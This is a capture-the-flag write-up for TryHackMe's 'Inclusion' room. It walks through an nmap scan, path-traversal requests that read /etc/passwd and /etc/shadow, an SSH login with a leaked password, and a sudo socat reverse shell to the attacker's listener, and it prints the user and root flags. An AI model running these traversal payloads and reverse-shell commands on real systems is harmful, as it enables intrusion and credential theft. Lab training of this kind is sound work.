# Inclusion

A beginner level LFI challenge

[Inclusion](https://tryhackme.com/room/inclusion)

## Topic's

- Network Enumeration
- Directory Traversal
- Brute Forcing Hash
- Misconfigured Binaries

## Appendix archive

Password: `1 kn0w 1 5h0uldn'7!`

## Task 1 Deploy

This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability.
If you have any kind of feedback please reach out to me on twitter at [0xmzfr](https://twitter.com/0xmzfr)

1. Deploy the machine and start enumerating

`No answer needed`

## Task 2 Root It

If you've deployed the VM then try to find the LFI parameters and get the user and root flag.

```
kali@kali:~/CTFs/tryhackme/Inclusion$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.174.186
[sudo] password for kali:
Sorry, try again.
[sudo] password for kali:
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-14 09:22 CEST
Nmap scan report for 10.10.174.186
Host is up (0.038s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e6:3a:2e:37:2b:35:fb:47:ca:90:30:d2:14:1c:6c:50 (RSA)
|   256 73:1d:17:93:80:31:4f:8a:d5:71:cb:ba:70:63:38:04 (ECDSA)
|_  256 d3:52:31:e8:78:1b:a6:84:db:9b:23:86:f0:1f:31:2a (ED25519)
80/tcp open  http    Werkzeug httpd 0.16.0 (Python 3.6.9)
|_http-server-header: Werkzeug/0.16.0 Python/3.6.9
|_http-title: My blog
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.80%E=4%D=10/14%OT=22%CT=1%CU=32945%PV=Y%DS=2%DC=T%G=Y%TM=5F86A7
OS:43%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OP
OS:S(O1=M508ST11NW7%O2=M508ST11NW7%O3=M508NNT11NW7%O4=M508ST11NW7%O5=M508ST
OS:11NW7%O6=M508ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)EC
OS:N(R=Y%DF=Y%T=40%W=F507%O=M508NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=
OS:AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(
OS:R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%
OS:F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N
OS:%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%C
OS:D=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 587/tcp)
HOP RTT      ADDRESS
1   36.47 ms 10.8.0.1
2   36.65 ms 10.10.174.186

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.24 seconds
```

```
kali@kali:~/CTFs/tryhackme/Inclusion$ curl -s http://10.10.174.186/article?name=../../../../etc/passwd | html2text
root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:
x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/
usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/
var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/
nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/
var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:
/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System
(admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/
nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network
Management,,,:/run/systemd/netif:/usr/sbin/nologin systemd-resolve:x:101:103:
systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin syslog:x:102:106::/
home/syslog:/usr/sbin/nologin messagebus:x:103:107::/nonexistent:/usr/sbin/
nologin _apt:x:104:65534::/nonexistent:/usr/sbin/nologin lxd:x:105:65534::/var/
lib/lxd/:/bin/false uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin dnsmasq:x:
107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin landscape:x:108:112::/var/
lib/landscape:/usr/sbin/nologin pollinate:x:109:1::/var/cache/pollinate:/bin/
false falconfeast:x:1000:1000:falconfeast,,,:/home/falconfeast:/bin/bash
#falconfeast:rootpassword sshd:x:110:65534::/run/sshd:/usr/sbin/nologin mysql:
x:111:116:MySQL Server,,,:/nonexistent:/bin/false
```

```
kali@kali:~/CTFs/tryhackme/Inclusion$ curl -s http://10.10.174.186/article?name=../../../../etc/shadow | html2text
root:$6$mFbzBSI/$c80cICObesNyF9XxbF6h6p6U2682MfG5gxJ5KtSLrGI8766/
etwzBvppTuug6aLoltiSmeqdIaEUg6f/NLYDn0:18283:0:99999:7::: daemon:*:17647:0:
99999:7::: bin:*:17647:0:99999:7::: sys:*:17647:0:99999:7::: sync:*:17647:0:
99999:7::: games:*:17647:0:99999:7::: man:*:17647:0:99999:7::: lp:*:17647:0:
99999:7::: mail:*:17647:0:99999:7::: news:*:17647:0:99999:7::: uucp:*:17647:0:
99999:7::: proxy:*:17647:0:99999:7::: www-data:*:17647:0:99999:7::: backup:*:
17647:0:99999:7::: list:*:17647:0:99999:7::: irc:*:17647:0:99999:7::: gnats:*:
17647:0:99999:7::: nobody:*:17647:0:99999:7::: systemd-network:*:17647:0:99999:
7::: systemd-resolve:*:17647:0:99999:7::: syslog:*:17647:0:99999:7:::
messagebus:*:17647:0:99999:7::: _apt:*:17647:0:99999:7::: lxd:*:18281:0:99999:
7::: uuidd:*:18281:0:99999:7::: dnsmasq:*:18281:0:99999:7::: landscape:*:18281:
0:99999:7::: pollinate:*:18281:0:99999:7::: falconfeast:
$6$dYJsdbeD$rlYGlx24kUUcSHTc0dMutxEesIAUA3d8nQeTt6FblVffELe3FxLE3gOID5nLxpHoycQ9mfSC.TNxLxet9BN5c/:
18281:0:99999:7::: sshd:*:18281:0:99999:7::: mysql:!:18281:0:99999:7:::
```

1. user flag

```
kali@kali:~/CTFs/tryhackme/Inclusion$ ssh falconfeast@10.10.174.186The authenticity of host '10.10.174.186 (10.10.174.186)' can't be established.
ECDSA key fingerprint is SHA256:VRi7CZbTMsqjwnWmH2UVPWrLVIZzG4BQ9J6X+tVsuEQ.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.174.186' (ECDSA) to the list of known hosts.
falconfeast@10.10.174.186's password:
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-74-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Oct 14 13:00:16 IST 2020

  System load:  0.01              Processes:           85
  Usage of /:   35.0% of 9.78GB   Users logged in:     0
  Memory usage: 32%               IP address for eth0: 10.10.174.186
  Swap usage:   0%


 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

3 packages can be updated.
3 updates are security updates.


Last login: Thu Jan 23 18:41:39 2020 from 192.168.1.107
falconfeast@inclusion:~$ ls
articles  user.txt
falconfeast@inclusion:~$ cat user.txt
60989655118397345799
```

`60989655118397345799`

2. root flag

```
falconfeast@inclusion:~$ sudo -l
Matching Defaults entries for falconfeast on inclusion:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User falconfeast may run the following commands on inclusion:
    (root) NOPASSWD: /usr/bin/socat
```

[https://gtfobins.github.io/gtfobins/socat/#sudo](https://gtfobins.github.io/gtfobins/socat/#sudo)

```
falconfeast@inclusion:~$ sudo socat tcp-connect:10.8.106.222:9001 exec:sh,pty,stderr,setsid,sigint,sane
```

```
kali@kali:~/CTFs/tryhackme/Inclusion$ nc -nlvp 9001
listening on [any] 9001 ...
connect to [10.8.106.222] from (UNKNOWN) [10.10.174.186] 47892
sh: 0: can't access tty; job control turned off
# whoami
whoami
root
# cd /root
cd /root
# ls
ls
root.txt
# cat root.txt
cat root.txt
42964104845495153909
```

`42964104845495153909`
